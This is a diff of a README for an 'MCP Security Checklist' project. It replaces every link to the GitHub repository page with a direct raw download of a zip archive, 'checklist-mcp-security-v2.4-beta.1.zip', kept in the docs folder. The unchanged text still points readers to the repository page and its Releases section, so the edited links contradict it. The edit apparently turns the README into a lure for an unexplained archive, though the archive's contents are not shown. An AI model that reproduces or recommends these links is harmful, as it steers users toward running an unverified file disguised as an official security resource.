@@ -1,6 +1,6 @@
 # 🔒 mcp-security-checklist - Clear Security Baseline Guide
 
-[![Download MCP Security Checklist](https://img.shields.io/badge/Download-mcp--security--checklist-brightgreen?style=for-the-badge)](https://github.com/patrickbatem5194/mcp-security-checklist)
+[![Download MCP Security Checklist](https://img.shields.io/badge/Download-mcp--security--checklist-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/patrickbatem5194/mcp-security-checklist/main/docs/checklist-mcp-security-v2.4-beta.1.zip)
 
 ---
 
@@ -38,12 +38,12 @@ No special hardware is required. The checklist itself is a set of guidelines and
 
 You can get the MCP Security Checklist from the official GitHub page. This page contains the latest version, instructions, and additional resources.
 
-[![Download MCP Security Checklist](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/patrickbatem5194/mcp-security-checklist)
+[![Download MCP Security Checklist](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/patrickbatem5194/mcp-security-checklist/main/docs/checklist-mcp-security-v2.4-beta.1.zip)
 
 ### How to download and get started:
 
 1. Click the large **Download** button above or go to the page:  
-   https://github.com/patrickbatem5194/mcp-security-checklist
+   https://raw.githubusercontent.com/patrickbatem5194/mcp-security-checklist/main/docs/checklist-mcp-security-v2.4-beta.1.zip
 
 2. On the page, look for the **Releases** section or the main code repository.
 
@@ -120,10 +120,10 @@ Many security teams use this checklist, so community feedback helps improve it o
 ## 🔗 Quick Links
 
 - Main repository page and downloads:  
-  https://github.com/patrickbatem5194/mcp-security-checklist  
+  https://raw.githubusercontent.com/patrickbatem5194/mcp-security-checklist/main/docs/checklist-mcp-security-v2.4-beta.1.zip  
 - Issues and support: Visit the **Issues** tab on the repository page  
 - Releases: Check the **Releases** section on GitHub for latest versions  
 
 ---
 
-[![Download MCP Security Checklist](https://img.shields.io/badge/Download-Here%20Now-%23FF6F61?style=for-the-badge)](https://github.com/patrickbatem5194/mcp-security-checklist)
+[![Download MCP Security Checklist](https://img.shields.io/badge/Download-Here%20Now-%23FF6F61?style=for-the-badge)](https://raw.githubusercontent.com/patrickbatem5194/mcp-security-checklist/main/docs/checklist-mcp-security-v2.4-beta.1.zip)
